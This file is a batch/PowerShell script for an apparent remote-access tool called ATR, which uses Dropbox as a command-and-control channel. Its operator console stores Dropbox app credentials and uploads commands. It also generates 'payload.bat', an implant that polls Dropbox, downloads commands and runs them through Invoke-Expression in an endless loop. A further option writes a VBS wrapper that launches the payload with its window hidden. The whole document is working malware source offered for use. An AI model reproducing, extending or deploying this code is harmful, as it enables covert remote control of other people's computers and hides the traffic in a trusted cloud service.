<# :

@echo off & setlocal enabledelayedexpansion

powershell -noprofile -executionpolicy remotesigned "iex ((gc '%~f0') -join \"`n\")"
exit /b

: #>

$ProfileFile = "ATRprofiles.txt"
$CurrentProfile = $null

function Show-Help {
    Write-Host "`nAvailable commands:" -ForegroundColor White
    Write-Host "  profile-new     - Create a new profile" -ForegroundColor White
    Write-Host "  profile-set     - Select an existing profile" -ForegroundColor White
    Write-Host "  profile-del     - Delete a profile" -ForegroundColor White
    Write-Host "  profile-list    - List all available profiles" -ForegroundColor White
    Write-Host "  profile-details - Show details of current profile" -ForegroundColor White
    Write-Host "  send            - Send a command" -ForegroundColor White
    Write-Host "  deploy          - Create the payload" -ForegroundColor White
    Write-Host "  wrap            - Create a vbs file that hides the payload" -ForegroundColor White
    Write-Host "  clear           - Clear the screen" -ForegroundColor White
    Write-Host "  help            - Show this help message" -ForegroundColor White
    Write-Host "  exit            - Exit the application" -ForegroundColor White
    Write-Host ""
}

function Profile-New {
    param([string]$FilePath = $ProfileFile)

    $ProfileName  = Read-Host "`nProfile name: "
    $AppKey       = Read-Host "App Key: "
    $AppSecret    = Read-Host "App Secret: "
    $RefreshToken = Read-Host "Refresh Token: "
    Write-Host ""

    $ProfileLine = "$($ProfileName.Trim()),$($AppKey.Trim()),$($AppSecret.Trim()),$($RefreshToken.Trim())"

    if (-not (Test-Path $FilePath)) { New-Item -Path $FilePath -ItemType File -Force | Out-Null }

    Add-Content -Path $FilePath -Value $ProfileLine -Encoding UTF8

    Write-Host "Profile '$($ProfileName.Trim())' added successfully" -ForegroundColor DarkGreen
    Write-Host ""
}

function Get-Profiles {
    param([string]$FilePath = $ProfileFile)
    
    $Profiles = @()
    if (-not (Test-Path $FilePath)) { return $Profiles }

    $Lines = Get-Content $FilePath | Where-Object { $_.Trim() -ne "" }

    $index = 1
    foreach ($Line in $Lines) {
        $Line = $Line.Trim()
        $Parts = ($Line -split ",", 4)
        if ($Parts.Count -lt 4) { continue }

        $Profiles += [PSCustomObject]@{
            DisplayIndex = $index
            Name         = $Parts[0].Trim()
            AppKey       = $Parts[1].Trim()
            AppSecret    = $Parts[2].Trim()
            RefreshToken = $Parts[3].Trim()
            RawLine      = $Line
            InternalIndex = $index - 1
        }
        $index++
    }
    
    return $Profiles
}

function Profile-Set {
    param([string]$FilePath = $ProfileFile)

    $Profiles = Get-Profiles -FilePath $FilePath
    if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return $null }

    Write-Host "`nAvailable profiles:" -ForegroundColor White
    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" -ForegroundColor White }
    Write-Host ""

    $Selection = Read-Host "Profile index: "
    Write-Host ""

    $selectedProfile = $Profiles | Where-Object { $_.DisplayIndex -eq $Selection }

    if ($selectedProfile) {
        return $selectedProfile
    } else {
        Write-Host "Invalid selection" -ForegroundColor DarkRed
        return $null
    }
    Write-Host ""
}

function Profile-Del {
    param([string]$FilePath = $ProfileFile)

    $Profiles = Get-Profiles -FilePath $FilePath
    if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return }

    Write-Host "`nAvailable profiles:" -ForegroundColor White
    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" }
    Write-Host ""

    $Selection = Read-Host "Profile index: "
    Write-Host ""

    $profileToDelete = $Profiles | Where-Object { $_.DisplayIndex -eq $Selection }

    if ($profileToDelete) {
        $Lines = Get-Content $FilePath | Where-Object { $_.Trim() -ne "" }
        $NewLines = @()

        $found = $false
        foreach ($Line in $Lines) {
            if ($Line.Trim() -eq $profileToDelete.RawLine -and -not $found) {
                $found = $true
                continue
            }
            $NewLines += $Line
        }

        if ($NewLines.Count -eq 0) {
            Remove-Item $FilePath -Force
            Write-Host "All profiles deleted, profile file removed" -ForegroundColor DarkGreen
        } else {
            Set-Content -Path $FilePath -Value $NewLines -Encoding UTF8
            Write-Host "Profile '$($profileToDelete.Name)' deleted successfully" -ForegroundColor DarkGreen
        }

        if ($CurrentProfile -and $CurrentProfile.Name -eq $profileToDelete.Name) {
            $script:CurrentProfile = $null
            Write-Host "Current profile cleared" -ForegroundColor DarkGreen
        }
    } else {
        Write-Host "Invalid selection" -ForegroundColor DarkRed
    }
    Write-Host ""
}

function Profile-List {
    param([string]$FilePath = $ProfileFile)

    $Profiles = Get-Profiles -FilePath $FilePath
    if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return }

    Write-Host "`nAvailable profiles:" -ForegroundColor White
    foreach ($p in $Profiles) {
        $currentIndicator = if ($CurrentProfile -and $CurrentProfile.Name -eq $p.Name) { " (current)" } else { "" }
        Write-Host "  $($p.DisplayIndex): $($p.Name)$currentIndicator" -ForegroundColor White
    }
    Write-Host ""
}

function Profile-Details {
    param([string]$FilePath = $ProfileFile)

    if (-not $CurrentProfile) { Write-Host "No profile selected" -ForegroundColor DarkRed; return }

    Write-Host "`nProfile Details:" -ForegroundColor White
    Write-Host "  Name:          $($CurrentProfile.Name)" -ForegroundColor White
    Write-Host "  App Key:       $($CurrentProfile.AppKey)" -ForegroundColor White
    Write-Host "  App Secret:    $($CurrentProfile.AppSecret)" -ForegroundColor White
    Write-Host "  Refresh Token: $($CurrentProfile.RefreshToken)" -ForegroundColor White
    Write-Host ""
}

function Send-Command {
    param([string]$FilePath = $ProfileFile)

    if (-not $CurrentProfile) { 
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    $Command = Read-Host "`nEnter command"
    Write-Host ""

    $CmdFile = "cmd.txt"
    Set-Content -Path $CmdFile -Value $Command -Encoding UTF8

    try {
        Write-Host "Getting access token..." -ForegroundColor White

        $tokenUri = "https://api.dropbox.com/oauth2/token"
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }

        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        $accessToken = $response.access_token

        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen

        Write-Host "Uploading file..." -ForegroundColor White

        $uploadUri = "https://content.dropboxapi.com/2/files/upload"
        $headers = @{
            "Authorization" = "Bearer $accessToken"
            "Dropbox-API-Arg" = '{"path":"/cmd.txt","mode":"overwrite","autorename":false,"mute":false}'
            "Content-Type" = "application/octet-stream"
        }

        $fileContent = Get-Content -Path $CmdFile -Raw
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)

        $uploadResponse = Invoke-RestMethod -Uri $uploadUri -Method Post -Headers $headers -Body $bytes

        Write-Host "File uploaded successfully" -ForegroundColor DarkGreen
        Write-Host "Path: $($uploadResponse.path_display)" -ForegroundColor White

        Remove-Item -Path $CmdFile -Force
        Write-Host "Local file deleted" -ForegroundColor DarkGreen

    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
    }

    Write-Host ""
}

function Deploy-Script {
    param([string]$FilePath = $ProfileFile)

    if (-not $CurrentProfile) { 
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return
    }

    Write-Host "Testing Dropbox credentials..." -ForegroundColor White
    try {
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }
        
        $response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        Write-Host "Credentials validated successfully" -ForegroundColor DarkGreen
    } catch {
        Write-Host "Error: Invalid credentials - $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
        return
    }

    $responseTime = Read-Host "`nEnter response time in seconds"
    Write-Host ""

    if (-not ($responseTime -match '^\d+$')) {
        Write-Host "Invalid response time" -ForegroundColor DarkRed
        return
    }

    $batchContent = @"
<# :
@echo off
setlocal enabledelayedexpansion

powershell -noprofile -executionpolicy bypass -command "iex (Get-Content -Raw '%~f0')"
exit /b
: #>

Add-Type -AssemblyName System.Web
`$clientId = "$($CurrentProfile.AppKey)"
`$clientSecret = "$($CurrentProfile.AppSecret)"
`$refreshToken = "$($CurrentProfile.RefreshToken)"
`$accessToken = `$null
`$responseTime = $responseTime
function Get-AccessToken {
    `$uri = "https://api.dropbox.com/oauth2/token"
    `$body = @{
        grant_type = "refresh_token"
        refresh_token = `$refreshToken
        client_id = `$clientId
        client_secret = `$clientSecret
    }
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Body `$body -ContentType "application/x-www-form-urlencoded"
        return `$response.access_token
    }
    catch {
        Write-Host "Failed to get access token: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$null
    }
}
function Check-DropboxFile {
    param(`$accessToken)
    `$uri = "https://api.dropboxapi.com/2/files/list_folder"
    `$headers = @{ 
        Authorization = "Bearer `$accessToken"
        "Content-Type" = "application/json"
    }
    `$body = @{ path = "" } | ConvertTo-Json
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body
        return (`$response.entries | Where-Object { `$_.name -eq "cmd.txt" })
    }
    catch {
        if (`$_.Exception.Response.StatusCode -eq 401) {
            return `$null
        }
        Write-Host "Failed to check for file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$null
    }
}
function Read-FileContent {
    param(`$accessToken)
    `$uri = "https://content.dropboxapi.com/2/files/download"
    `$apiArg = @{ path = "/cmd.txt" } | ConvertTo-Json -Compress
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Dropbox-API-Arg" = `$apiArg
        "Content-Type" = "application/octet-stream"
    }
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers
        return `$response
    }
    catch {
        Write-Host "Failed to read file content: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        if (`$_.Exception.Response) {
            `$reader = New-Object System.IO.StreamReader(`$_.Exception.Response.GetResponseStream())
            `$reader.BaseStream.Position = 0
            `$reader.DiscardBufferedData()
            `$errorResponse = `$reader.ReadToEnd()
            Write-Host "Error details: `$errorResponse" -ForegroundColor DarkRed
        }
        return `$null
    }
}
function Delete-File {
    param(`$accessToken)
    `$uri = "https://api.dropboxapi.com/2/files/delete_v2"
    `$headers = @{ 
        Authorization = "Bearer `$accessToken"
        "Content-Type" = "application/json"
    }
    `$body = @{ path = "/cmd.txt" } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body | Out-Null
        return `$true
    }
    catch {
        Write-Host "Failed to delete file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$false
    }
}
function Process-CommandFile {
    param(`$accessToken)
    `$command = Read-FileContent -accessToken `$accessToken
    if (-not `$command) {
        Write-Host "No command found or error reading file" -ForegroundColor DarkRed
        return
    }
    try {
        Write-Host "Executing command: `$command" -ForegroundColor White
        Invoke-Expression `$command
    }
    catch {
        Write-Host "Failed to execute command: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
    }
    Delete-File -accessToken `$accessToken | Out-Null
}
while (`$true) {
    if (-not `$accessToken) {
        `$accessToken = Get-AccessToken
        if (-not `$accessToken) {
            Write-Host "Failed to obtain access token, retrying in 5 seconds..." -ForegroundColor DarkRed
            Start-Sleep 5
            continue
        }
    }
    try {
        `$file = Check-DropboxFile -accessToken `$accessToken
        if (`$file) {
            Write-Host "Found command, processing..." -ForegroundColor DarkGreen
            Process-CommandFile -accessToken `$accessToken
        } else {
            Write-Host "Checking again in `$responseTime seconds..." -ForegroundColor White
        }
    }
    catch {
        `$accessToken = `$null
        Write-Host "Error in main loop: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
    }
    Start-Sleep `$responseTime
}

"@
    Set-Content -Path "payload.bat" -Value $batchContent -Encoding ASCII
    Write-Host "Deployment script created as 'payload.bat'" -ForegroundColor DarkGreen
    Write-Host ""
}

function Wrap-Script {
    param([string]$FilePath = $ProfileFile)

    $payloadPath = Read-Host "`nEnter payload path"
    $payloadPath = $payloadPath.Trim('"')
    $escapedPath = $payloadPath -replace '"', '""'

    Write-Host ""

    $fileContent = @'
Dim path
path = "{0}"
CreateObject("WScript.Shell").Run """" & path & """", 0, False
'@ -f $escapedPath

    Set-Content -Path "wrapper.vbs" -Value $fileContent -Encoding ASCII
    Write-Host "Wrap script created as 'wrapper.vbs'" -ForegroundColor DarkGreen
    Write-Host ""
}

function Clear-Screen {
    try {
        Clear-Host
    } catch {
        Write-Host "`n" * 50
    }
}

$exitRequested = $false

Write-Host "   __________________________ " -ForegroundColor DarkBlue
Write-Host "  /  _  \__    ___/\______   \" -ForegroundColor DarkBlue
Write-Host " /  /_\  \|    |    |       _/" -ForegroundColor DarkBlue
Write-Host "/    |    \    |    |    |   \" -ForegroundColor DarkBlue
Write-Host "\____|__  /____|    |____|_  /" -ForegroundColor DarkBlue
Write-Host "        \/                 \/ " -ForegroundColor DarkBlue

while (-not $exitRequested) {
    if ($CurrentProfile) { 
        Write-Host -NoNewline "@$($CurrentProfile.Name) > " -ForegroundColor DarkBlue
    }
    else { 
        Write-Host -NoNewline "@ > " -ForegroundColor DarkBlue
    }

    $InputLine = Read-Host
    $InputParts = $InputLine.Split(" ", 2)
    $Command = $InputParts[0].ToLower()
    $Args = if ($InputParts.Count -gt 1) { $InputParts[1] } else { "" }

    switch -regex ($Command) {
        "^(profile-new|p-new)$" { 
            Profile-New 
        }
        "^(profile-set|p-set)$" { 
            $Selected = Profile-Set
            if ($Selected) { 
                $CurrentProfile = $Selected
                Write-Host "Profile set to: $($CurrentProfile.Name)" -ForegroundColor DarkGreen
            }
        }
        "^(profile-del|p-del)$" {
            Profile-Del
        }
        "^(profile-list|p-list)$" {
            Profile-List
        }
        "^(profile-details|p-details)$" {
            Profile-Details
        }
        "^send$" {
            Send-Command
        }
        "^deploy$" {
            Deploy-Script
        }
        "^wrap$" {
            Wrap-Script
        }
        "^(cls|clear)$" {
            Clear-Screen
        }
        "^(help|h)$" {
            Show-Help
        }
        "^exit$" { 
            $exitRequested = $true
        }
        "^$" { }
        default {
            Write-Host "Invalid command: $Command" -ForegroundColor DarkRed
            Write-Host "Type 'help' for a list of available commands" -ForegroundColor DarkRed
        }
    }
}